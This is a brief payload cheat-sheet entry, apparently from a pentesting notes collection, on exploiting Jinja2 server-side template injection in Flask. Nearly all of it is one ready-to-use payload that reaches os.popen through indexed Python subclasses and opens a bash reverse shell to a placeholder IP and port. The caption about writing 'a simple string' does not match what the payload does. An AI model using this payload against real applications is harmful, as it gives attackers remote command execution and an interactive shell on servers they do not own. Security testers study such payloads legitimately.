## PYTHON
### 1) Jinja2 -flask framework 
exploitation: payload techniques using index positions
To write a simple string, we can write this payload (note: index values may vary):

{{''.__class__.__base__.__subclasses__()[141].__init__.__globals__['sys'].modules['os'].popen("bash -c 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1'").read()}}
